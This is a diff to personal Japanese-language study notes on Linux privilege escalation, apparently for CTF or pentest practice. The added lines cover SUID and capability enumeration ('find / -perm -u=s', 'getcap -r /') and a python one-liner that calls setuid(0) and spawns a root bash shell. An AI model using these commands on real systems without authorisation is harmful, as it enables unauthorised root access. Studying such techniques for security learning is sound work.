@@ -349,6 +349,8 @@ run
 
 # 特権エスカレーション基本戦略 [Linux]
 
+[毎回必ず見る資料](https://xorond.com/posts/2020/08/linux-privilege-escalation-basics/)
+
 とっかかりは、ps aux で良さそう。
 ps -auxww | grep vnc　とかで、細かく情報見る。
 
@@ -366,13 +368,30 @@ f: 情報を省略せず、完全なフォーマットで出力する。
 
 [記事](https://lanchesters.site/linux-ps-ef/)
 
+### SUID binaries and capabilities
 
 LinPEAS で、SUID ファイルがついた[ファイルを探し](https://jpn.nec.com/cybersecurity/blog/200619/index.html)ても良い。
 
 ```
 find / -perm -u=s -type f 2>/dev/null
 ```
-もあり。
+
+・　capability
+
+[Cap write up]
+
+[解説リンク](https://k1low.hatenablog.com/entry/2020/07/03/083000)
+
+
+```
+
+getcap -r / 2>/dev/null
+
+これで、python がでてきたら。
+
+python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+``
 
 
 ・var/log/syslog 見て、ある特定のファイルが定期実行されているなどの手がかりを見にいく。
